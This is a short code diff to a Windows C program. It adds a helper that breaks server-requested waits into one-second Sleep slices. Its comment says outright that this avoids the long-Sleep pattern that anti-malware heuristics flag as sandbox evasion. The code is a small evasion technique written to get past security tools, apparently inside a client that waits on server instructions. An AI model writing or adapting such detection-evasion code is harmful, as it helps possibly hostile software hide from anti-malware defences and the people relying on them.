@@ -12,6 +12,12 @@ static void systemPath(wchar_t* out, const wchar_t* name) {
     wcscat(out, name);
 }
 
+// A pause of ms milliseconds taken one second at a time. Used for the waits a server asks for (5 to 20 seconds):
+// one long Sleep is a pattern anti-malware heuristics flag as sandbox evasion, short slices are not.
+static void pauseMs(DWORD ms) {
+    while (ms) { DWORD s = ms > 1000 ? 1000 : ms; Sleep(s); ms -= s; }
+}
+
 // Runs the page's one background job, replacing the handle of the last one
 static void startWorker(LPTHREAD_START_ROUTINE proc, LPVOID arg) {
     if (g_worker) CloseHandle(g_worker);
